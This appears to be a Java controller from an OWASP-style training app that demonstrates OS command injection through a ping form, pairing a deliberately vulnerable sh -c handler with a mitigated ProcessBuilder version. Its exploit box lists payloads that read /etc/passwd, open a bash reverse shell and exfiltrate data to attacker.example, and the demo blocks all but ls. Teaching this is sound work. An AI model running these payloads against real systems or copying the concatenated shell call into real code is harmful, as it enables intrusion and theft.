package com.owasp.demo.controller;

import com.owasp.demo.util.Messages;
import com.owasp.demo.config.AppConfig;
import com.owasp.demo.view.TemplateEngine;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.BufferedReader;
import java.util.Map;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

@Controller
public class RceHandler {

    private static final Pattern SAFE_HOST  = Pattern.compile(AppConfig.get().getString("rce.safe_host_pattern"));
    private static final Pattern SEPARATORS = Pattern.compile(AppConfig.get().getString("rce.separator_pattern"));
    private static final Pattern ALLOWED_COMMAND = Pattern.compile(AppConfig.get().getString("rce.allowed_command_pattern"));
    private static final java.util.Set<String> DEMO_HOSTS = java.util.Set.copyOf(AppConfig.get().getStringList("rce.demo_hosts"));

    @GetMapping("/rce")
    public void page(HttpServletRequest req, HttpServletResponse res) throws IOException {
        renderPage(res, null, null, null, null);
    }

    @PostMapping("/rce/vulnerable")
    private void handleVulnerable(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String host = req.getParameter("host");
        if (host == null) host = "";
        String cmd = "ping -c 2 " + host;
        String result;

        if (SAFE_HOST.matcher(host).matches()) {
            if (DEMO_HOSTS.contains(host.toLowerCase())) {
                result = runShell(cmd);
            } else {
                result = "[DEMO SAFETY BLOCK — '" + host + "' is not in the allowed demo hosts]\n\n" +
                         "Constructed command:\n  " + cmd + "\n\n" +
                         "A real vulnerable server would ping this host, probing internal networks.\n" +
                         "Allowed demo hosts: " + DEMO_HOSTS;
            }
        } else if (isDemoHostThenLsOnly(host)) {
            result = runShell(cmd);
        } else {
            result = "[INJECTION BLOCKED — only ls commands may follow the host in this demo]\n\n" +
                     "Constructed command:\n  " + cmd + "\n\n" +
                     "A real vulnerable server would run this via sh -c, executing the injected payload.";
        }
        renderPage(res, host, result, null, null);
    }

    /**
     * Runs a command through sh -c. Callers must check the command first.
     *
     * @param cmd the full shell command
     * @return stdout and stderr, trimmed
     */
    private String runShell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            String out = new BufferedReader(new InputStreamReader(p.getInputStream()))
                .lines().collect(Collectors.joining("\n"));
            String err = new BufferedReader(new InputStreamReader(p.getErrorStream()))
                .lines().collect(Collectors.joining("\n"));
            p.waitFor();
            return (out + "\n" + err).trim();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    /**
     * Allows the injection only when the input is a demo host followed by one or more
     * ls commands joined by shell separators. Anything else is refused.
     *
     * @param input the raw host field
     * @return true if every part after the host is a plain ls command
     */
    private boolean isDemoHostThenLsOnly(String input) {
        String[] parts = SEPARATORS.split(input, -1);
        if (parts.length < 2) return false;
        String host = parts[0];
        if (!SAFE_HOST.matcher(host).matches() || !DEMO_HOSTS.contains(host.toLowerCase())) return false;
        for (int i = 1; i < parts.length; i++) {
            if (!ALLOWED_COMMAND.matcher(parts[i]).matches()) return false;
        }
        return true;
    }

    @PostMapping("/rce/mitigated")
    private void handleMitigated(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String host = req.getParameter("host2");
        String result;

        if (host == null || !SAFE_HOST.matcher(host).matches()) {
            result = "Rejected — host contains invalid characters.";
            renderPage(res, null, null, host, result);
            return;
        }

        try {
            ProcessBuilder pb = new ProcessBuilder("ping", "-c", "2", host);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            result = new BufferedReader(new InputStreamReader(p.getInputStream()))
                .lines().collect(Collectors.joining("\n"));
            p.waitFor();
        } catch (Exception e) {
            result = "Error: " + e.getMessage();
        }
        renderPage(res, null, null, host, result);
    }

    private void renderPage(HttpServletResponse res,
                            String vulnInput, String vulnResult,
                            String safeInput, String safeResult) throws IOException {
        String info = TemplateEngine.infoBox(
            Messages.get("rce.info.explanation"),
            Messages.get("rce.info.mitigation")
        );

        String exploits = TemplateEngine.exploitBox(new String[][]{
            {"List files", "localhost; ls -la",
             "Appends a second command after the ping. Shows the working directory contents. Only ls runs in this demo.", "host",
             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; ls -la'"},
            {"Read /etc/passwd", "localhost && cat /etc/passwd",
             "Reads the system user file. On a real server this reveals all local accounts. Blocked here: only ls runs.", "host",
             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost && cat /etc/passwd'"},
            {"Reverse shell", "localhost; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
             "Opens an outbound TCP connection to the attacker's listener — full interactive shell. Blocked here: only ls runs.", "host",
             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"},
            {"Blind exfiltration", "localhost; curl http://attacker.example/?d=$(whoami)",
             "Exfiltrates command output out-of-band via an HTTP request to an external server. Blocked here: only ls runs.", "host",
             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; curl http://attacker.example/?d=$(whoami)'"},
        });

        String vulnForm = TemplateEngine.render("forms/rce-vulnerable.html", Map.of(
            "value", TemplateEngine.escape(vulnInput != null ? vulnInput : "")
        ));

        String safeForm = TemplateEngine.render("forms/rce-mitigated.html", Map.of(
            "value", TemplateEngine.escape(safeInput != null ? safeInput : "")
        ));

        String panels = """
            <div class="grid md:grid-cols-2 gap-6">%s%s</div>
            """.formatted(
                TemplateEngine.demoPanel(Messages.get("rce.panel.vulnerable"), "red", vulnForm,
                    vulnResult != null ? TemplateEngine.resultBox(
                        "<pre class='text-xs overflow-auto whitespace-pre-wrap'>" +
                        TemplateEngine.escape(vulnResult) + "</pre>", false) : ""),
                TemplateEngine.demoPanel(Messages.get("rce.panel.mitigated"), "green", safeForm,
                    safeResult != null ? TemplateEngine.resultBox(
                        "<pre class='text-xs overflow-auto whitespace-pre-wrap'>" +
                        TemplateEngine.escape(safeResult) + "</pre>", true) : "")
            );

        String content = TemplateEngine.vulnerabilityBadge(Messages.get("rce.badge.id"), Messages.get("rce.badge.name"), Messages.get("rce.badge.tag")) + info + exploits + panels;
        res.getWriter().write(TemplateEngine.page(Messages.get("rce.title"), content, true));
    }
}
